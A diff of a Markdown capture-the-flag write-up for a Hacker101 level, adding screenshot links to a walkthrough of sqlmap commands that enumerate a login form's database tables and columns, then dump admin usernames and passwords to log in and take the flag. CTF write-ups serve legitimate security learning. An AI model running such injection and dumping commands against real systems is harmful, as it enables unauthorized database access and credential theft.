@@ -37,17 +37,26 @@ Finally got some results! I got all the databases, im gonna take a look into lev
 
 `sqlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 --tables`
 
+![sqlmap_databases](sqlmap_tables.png)
+
 Lets get into admins table and see its columns
+
+![sqlmap_databases](sqlmap_columns.png)
 
 `qlmap -u "https:/{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins --columns`
 
 Now lets have a look into the usernames! Dump it!
 
+![sqlmap_databases](sqlmap_usernames.png)
+
 `qlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins -C username --dump`
 
 Now lets retrieve the pass
+![sqlmap_databases](sqlmap_databases.png)
 
 `sqlmap -u "https://{HEX_VALUE_HERE}.ctf.hacker101.com/login" --data="username=admin&password=admin" --method=POST -D level2 -T admins -C password --dump`
+
+![sqlmap_databases](sqlmap_password.png)
 
 Now lets try log in. Got it! We have the last flag
 
